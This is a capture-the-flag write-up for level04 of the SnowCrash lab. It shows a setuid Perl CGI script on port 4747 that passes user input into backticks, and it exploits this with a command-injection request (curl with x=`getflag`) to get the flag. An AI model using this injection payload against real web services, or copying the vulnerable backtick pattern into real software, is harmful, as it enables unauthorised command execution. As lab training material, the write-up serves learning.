# Writeup level04


In this machine we have suid file with Suid/SGID set:

-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl



that the code in level04.pl 
```
#!/usr/bin/perl
# localhost:4747

use CGI qw{param};

# Set the content type of the response to text/html
print "Content-type: text/html\n\n";

# Define the subroutine x
sub x {
  $y = $_[0];
  # Execute the command "echo $y" and capture the output
  print `echo $y 2>&1`;
}

# Call the subroutine x with the value of the parameter "x" from the request
x(param("x"));
```
after noticing the comment in this script we can scan the port to see if port 4747 is open

ss -a
![ss-command.png](https://i.postimg.cc/FhssNh7r/ss-command.png)


```
level04@SnowCrash:~$ ss -a
State      Recv-Q Send-Q                                                Local Address:Port                                                    Peer Address:Port   
LISTEN     0      128                                                              :::4646                                                              :::*       
LISTEN     0      128                                                              :::4747                                                              :::*       
LISTEN     0      128                                                              :::http                                                              :::*       
LISTEN     0      128                                                              :::4242                                                              :::*       
LISTEN     0      128                                                               *:4242                                                               *:*       
LISTEN     0      32                                                        127.0.0.1:pcrd                                                               *:*       
ESTAB      0      0                                                       192.168.1.3:4242                                                     192.168.1.9:57722  
``` 


After testing with port 4747 and having a web server listening, and upon examining the line `x(param("x"));`, we can understand that the Perl CGI script retrieves the value of the 'x' parameter from the query string. The retrieved value is then used as an argument to the function sub x, where the command `print 'echo $y 2>&1'; `is executed. This command prints the output of the executed command to the web page. In essence, the script takes user-supplied input from the 'x' parameter and runs it as a shell command, displaying the results on the web page. It's important to note that this approach poses a security risk, as it may be vulnerable to command injection attacks.
Test:

![level04_test](https://cdn.discordapp.com/attachments/1164485225875783701/1172253459316232192/image.png?ex=655fa51c&is=654d301c&hm=de8352bb326e61c3e4b4faf4d4f23733ea4dbae76596d8dbf1afd5c7023db3ff&)


### let to explain 

* $y = $_[0];
* print `echo $y 2>&1`;
* x(param("x")); 

In the Bash shell, the backtick character (`) is used to perform command substitution. It allows you to execute a command within a command and capture the output of that command.
Alternatively, you can also use the modern syntax $() for command substitution, which provides better readability and can be nested more easily:
that means if we send a request with parameter x=`ls` that "ls" now not an argument for echo is another command that save in y that.
- print `echo `ls` 2>&1`
now let have the flag and go to anther level



we can use : curl 'http://localhost:4747?x=`getflag`'

![level04_exploit](https://cdn.discordapp.com/attachments/1164485225875783701/1172256517702041720/image.png?ex=655fa7f5&is=654d32f5&hm=6dd0f38d3de5815dd36f53466a430ffedccb701df0e9052cc0231c3a52f5fff3&)
